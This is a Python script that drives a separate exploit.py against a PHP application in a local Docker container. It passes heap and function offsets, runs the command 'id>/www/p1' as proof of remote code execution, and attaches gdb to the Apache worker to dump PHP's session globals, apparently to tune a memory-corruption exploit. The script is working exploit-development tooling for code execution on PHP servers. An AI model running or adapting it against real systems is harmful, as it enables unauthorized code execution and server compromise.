import subprocess, sys, time, os

BASE = r"C:\Users\likat\p2s52704"
c, port = "p2s8335", "18112"
zif, dtor = "0x3ac080", "0x49ec50"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
sh(f'docker restart {c}')
time.sleep(3)

env = os.environ.copy()
env["P2S_PAUSE"] = "25"
proc = subprocess.Popen(
    [sys.executable, BASE + r"\exploit.py",
     "-u", f"http://127.0.0.1:{port}/index.php",
     "--profile", "bookworm",
     "--zif-offset", zif, "--dtor-offset", dtor,
     "--htdata-offset", "0x690d8",
     "--retries", "1", "--no-retry-rotate",
     "-c", "id>/www/p1", "--fetch", "/www/p1"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    text=True, env=env, bufsize=1
)

pause_hit = False
for line in proc.stdout:
    print(line, end="", flush=True)
    if "PAUSE" in line:
        pause_hit = True
        break

if not pause_hit:
    proc.wait(); sys.exit(1)

print("\n[*] PAUSE - dumping ps_globals + heap...", flush=True)
time.sleep(1)

r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1] if pids else None
r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
maps_line = r.stdout.strip()
B = int(maps_line.split("-")[0], 16)
print(f"[*] worker={worker_pid} libphp_base={hex(B)}", flush=True)

# ps_globals is at B+0x10432a0. Dump 0x200 bytes (512B) to cover the whole struct.
ps = B + 0x10432a0
gdb_script = (
    "set pagination off\nset confirm off\nset width 0\n"
    f"x/64gx {hex(ps)}\n"
    "echo ---END---\\n"
)
gl = os.path.join(BASE, "heapdump.gdb")
with open(gl, "w") as f:
    f.write(gdb_script)
sh(f'docker cp "{gl}" {c}:/tmp/heapdump.gdb')
sh(f'docker exec {c} sh -c "gdb -batch -p {worker_pid} -x /tmp/heapdump.gdb > /tmp/heapdump.out 2>&1"')

r = sh(f'docker exec {c} cat /tmp/heapdump.out 2>/dev/null')
print("\n=== ps_globals dump (B+0x10432a0) ===", flush=True)
print(r.stdout, flush=True)

proc.kill(); proc.wait()
print("\n[*] done", flush=True)
